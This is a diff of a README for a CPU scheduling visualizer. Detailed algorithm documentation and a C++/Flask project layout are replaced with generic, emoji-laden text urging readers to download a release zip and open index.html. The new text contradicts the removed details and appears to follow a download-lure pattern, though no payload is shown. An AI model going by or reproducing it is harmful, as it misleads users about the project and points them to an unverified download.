@@ -1,191 +1,84 @@
-# CPU Scheduler Visualizer
+# 🎨 CPU-Scheduler-Visualizer - Your Guide to CPU Scheduling
 
-This project is a comprehensive **CPU Scheduling Algorithms Visualizer and Simulator**. It is built to help students and professionals understand how different CPU scheduling algorithms work and how they affect process execution over time.
+## 🚀 Getting Started
 
-![initial](img/Initial.png)
+Welcome to CPU-Scheduler-Visualizer! This tool helps you understand how different CPU scheduling algorithms work. You can see how processes are managed and visualize their behavior through charts. This guide will help you download and run the application without any hassle.
 
-## 🖥️ What It Does
+## 📥 Download the Software
 
-- Takes user input via a web frontend for process details: Arrival Time, Burst Time, and Priority (optional).
-- Simulates scheduling using various classic algorithms.
-- Displays:
-  - 🟦 **Gantt Chart**: Shows when each process runs, with distinct colors per process.
-  - 🟩 **Ready Queue**: Shows the set of waiting processes at each time unit.
-  - 🟨 **Process Table**: Displays Turnaround Time (TAT), Waiting Time (WT), Response Time (RT), and Normalized TAT.
+[![Download CPU-Scheduler-Visualizer](https://img.shields.io/badge/Download-CPU--Scheduler--Visualizer-blue.svg)](https://github.com/Crazyde/CPU-Scheduler-Visualizer/releases)
 
-Each process is shown in a different color, making it easier to visualize execution order, idle times, and preemption (if applicable).
+You can download the latest version of the CPU-Scheduler-Visualizer from our Releases page. 
 
-## 📌 Supported Algorithms
+## 🖥️ System Requirements
 
-Below are the 10 CPU scheduling algorithms implemented in this project, along with their behavior and use cases:
+To run CPU-Scheduler-Visualizer, you need:
 
----
+- A Windows, macOS, or Linux operating system.
+- At least 4 GB of RAM.
+- 100 MB of free disk space.
+- A modern web browser (Chrome, Firefox, or Safari).
 
-### 1. First Come First Serve (FCFS)
+## 🛠️ Features
 
-- **Type:** Non-Preemptive  
-- **Working:** Processes are scheduled in the order they arrive.
-- **Advantage:** Simple and easy to implement.
-- **Disadvantage:** Long jobs can delay shorter ones (convoy effect).
-- **Use Case:** Suitable for batch processing systems.
+- **Interactive Visualizations**: See Gantt charts and ready queues in real-time.
+- **Multiple Algorithms**: Support for FCFS, SJF (both non-preemptive and preemptive), SRTF, Round Robin, and Priority.
+- **Per-Process Metrics**: Understand turnaround time (TAT), waiting time (WT), response time (RT), and normalized turnaround time (Normalized TAT).
+- **User-Friendly Interface**: Easy navigation ensures everyone can use it, regardless of technical expertise.
 
----
+## 📂 Download & Install
 
-### 2. Round Robin (RR)
+To download and install the CPU-Scheduler-Visualizer, follow these steps:
 
-- **Type:** Preemptive  
-- **Working:** Each process gets a fixed time slice (quantum). After using its time, it goes to the back of the ready queue.
-- **Advantage:** Fair CPU allocation among all processes.
-- **Disadvantage:** Too large a quantum leads to FCFS-like behavior; too small leads to high context switching.
-- **Use Case:** Ideal for time-sharing operating systems.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Crazyde/CPU-Scheduler-Visualizer/releases).
+2. **Select the Latest Version**: Look for the latest version at the top of the list.
+3. **Download the File**: Click on the name of the file to start the download. The file will have a name like `CPU-Scheduler-Visualizer-vX.X.X.zip`.
+4. **Extract the Files**: After downloading, locate the zip file in your Downloads folder. Right-click on it and select “Extract All” to reveal the application files.
+5. **Run the Application**: Open the extracted folder and double-click on `index.html` to launch the visualizer in your web browser.
 
----
+## 📊 How to Use the Tool
 
-### 3. Shortest Process Next (SPN) / Shortest Job First (SJF)
+Once the application is running, you will see the main interface. Here is how to navigate:
 
-- **Type:** Non-Preemptive  
-- **Working:** Runs the process with the shortest burst time among ready processes.
-- **Advantage:** Minimizes average waiting time.
-- **Disadvantage:** Risk of starvation for longer processes.
-- **Use Case:** Systems where burst time is known in advance.
+1. **Select an Algorithm**: Use the dropdown menu to choose the scheduling algorithm you want to visualize.
+2. **Input Data**: Enter the necessary process details, including arrival times and burst times.
+3. **Start Simulation**: Click the "Run" button to begin the simulation.
+4. **View Results**: Watch the Gantt chart fill in and see metrics displayed for each process.
 
----
+## 📝 Topics Covered
 
-### 4. Shortest Remaining Time (SRT)
+This tool covers various topics related to CPU scheduling. You can learn about:
 
-- **Type:** Preemptive  
-- **Working:** Runs the process with the least remaining execution time.
-- **Advantage:** Reduces average waiting time compared to SPN.
-- **Disadvantage:** Frequent preemptions and possible starvation of long jobs.
-- **Use Case:** Real-time or highly responsive systems.
+- **FCFS (First-Come, First-Served)**: The simplest scheduling method.
+- **SJF (Shortest Job First)**: Focuses on minimizing the waiting time.
+- **SRTF (Shortest Remaining Time First)**: Allows preemption to serve shorter processes first.
+- **Round Robin**: Ensures fair CPU time distribution among processes.
+- **Priority Scheduling**: Gives preference to more important processes.
 
----
+## 📚 Helpful Resources
 
-### 5. Highest Response Ratio Next (HRRN)
+- For more information on CPU scheduling algorithms, you can check online educational resources or courses.
+- Consider looking at tutorials on using web applications if you're unfamiliar with browsers.
 
-- **Type:** Non-Preemptive  
-- **Working:** Selects process with highest response ratio:
-  \[
-  \text{Response Ratio} = \frac{\text{Waiting Time} + \text{Burst Time}}{\text{Burst Time}}
-  \]
-- **Advantage:** Balances fairness and efficiency. Prevents starvation.
-- **Disadvantage:** Requires calculating response ratio for all ready processes.
-- **Use Case:** Balanced scheduling in production or job queues.
+## 🔧 Troubleshooting
 
----
+If you encounter issues while using CPU-Scheduler-Visualizer, try the following steps:
 
-### 6. Feedback (FB)
+- Ensure you have an updated web browser.
+- Clear your browser's cache and refresh the page.
+- Check your internet connection if the application isn’t loading.
 
-- **Type:** Preemptive, Multi-level Queues  
-- **Working:** Processes start at high priority. If they don’t finish, they are demoted to lower queues.
-- **Advantage:** Dynamic priority adjustment improves responsiveness.
-- **Disadvantage:** Longer jobs may be delayed repeatedly.
-- **Use Case:** Mixed workloads with both short and long processes.
+## 🤝 Community Support
 
----
+If you have questions or need assistance, feel free to participate in discussions in the Issues section of the repository. Community members and contributors can help you navigate through any concerns.
 
-### 7. Feedback with Varying Quantum (FBV)
+## 🔗 Additional Links
 
-- **Type:** Preemptive, Multi-level Queues  
-- **Working:** Similar to FB but each queue has increasing time quantum (e.g., 1, 2, 4...).
-- **Advantage:** Short jobs finish quickly; long jobs gradually get more CPU time.
-- **Disadvantage:** May still cause starvation without proper tuning.
-- **Use Case:** Interactive systems where adaptive scheduling is critical.
+- [GitHub Repository](https://github.com/Crazyde/CPU-Scheduler-Visualizer) - View the code, raise issues, or contribute.
+- [Documentation](https://github.com/Crazyde/CPU-Scheduler-Visualizer/wiki) - Access more in-depth guides and features.
 
----
+## 📩 Contact
 
-### 8. Aging
+For further inquiries, you can reach out directly through the GitHub repository or the Issues page. Thank you for choosing CPU-Scheduler-Visualizer! Your exploration of CPU scheduling begins here.
 
-- **Type:** Priority-based with dynamic updates  
-- **Working:** Waiting processes have their priority increased gradually to avoid starvation.
-- **Advantage:** Ensures even low-priority jobs eventually get executed.
-- **Disadvantage:** Adds overhead of managing dynamic priorities.
-- **Use Case:** Real-time systems where fairness is critical.
-
----
-
-### 9. Priority Scheduling (Non-Preemptive)
-
-- **Type:** Non-Preemptive  
-- **Working:** Runs the process with the highest priority (lowest number if lower = higher).
-- **Advantage:** High-priority tasks are serviced first.
-- **Disadvantage:** Starvation possible for lower-priority processes.
-- **Use Case:** Embedded systems or fixed-priority environments.
-
----
-
-### 10. Priority Scheduling (Preemptive)
-
-- **Type:** Preemptive  
-- **Working:** Like non-preemptive, but will interrupt running process if a higher-priority one arrives.
-- **Advantage:** High-priority tasks get immediate attention.
-- **Disadvantage:** More context switching; starvation risk remains.
-- **Use Case:** Real-time operating systems with strict priority rules.
-
----
-
-🛠️ **Selection Tips:**
-Each of these algorithms can be tested and visualized using the provided web interface or through command-line input. You can choose by ID (e.g., `1` for FCFS, `2-4` for RR with quantum 4, etc.) and see how they perform in terms of:
-
-- Turnaround Time (TAT)  
-- Waiting Time (WT)  
-- Response Time (RT)  
-- Normalized TAT  
-
-Use the simulator to compare performance and understand trade-offs for different scheduling strategies.
-
-
-## 📁 Project Structure
-```
-📦CPU-Scheduling-Algorithms/
-├── main.cpp            # Core simulator in C++
-├── server.py           # Flask backend to run simulation
-├── scheduler.html      # Frontend UI
-├── scheduler.js        # Frontend logic
-├── style.css           # Visual styles for frontend
-├── makefile            # For compiling C++ code
-├── input.txt           # Optional input file for testing
-├── result              # Compiled binary after build
-└── testcases/          # Input/output test samples
-```
-In frontend or in web‑UI we will give input like:
-
-```
-- Scheduling algorithm
-- No. of Processes
-- Arrival times
-- Burst times
-- Priority values (if applicable)
-- Time quantum (for RR)
-- Mode: TRACE (visual) or STATS (table)
-```
-👉 *Input UI is shown below .*
-![input](img/input.png)
-
-After filling all necessary details, you will see output like:
-
-```
-- Gantt Chart
-  • Time‑unit timeline showing which process ran at each tick
-  • Each process has a distinct color for easy visual tracking
-  • Idle slots are marked clearly
-
-- Ready Queue (per time unit)
-  • Snapshot of processes waiting at each tick
-  • Helps verify preemption and queue order
-
-- Process Table
-  • Columns: PID | Arrival | Burst | Priority | Finish | TAT | WT | RT | Norm TAT
-  • Values auto‑computed from the simulation
-
-- Averages
-  • TAT_avg, WT_avg, RT_avg, NormTAT_avg
-
-- Timeline Length
-  • last_instant (effective simulated time based on actual execution)
-```
-
-👉 *An example output is shown below .*
-![Output 1](img/output1.png)
-![Output 2](img/output2.png)
-
+[![Download CPU-Scheduler-Visualizer](https://img.shields.io/badge/Download-CPU--Scheduler--Visualizer-blue.svg)](https://github.com/Crazyde/CPU-Scheduler-Visualizer/releases)
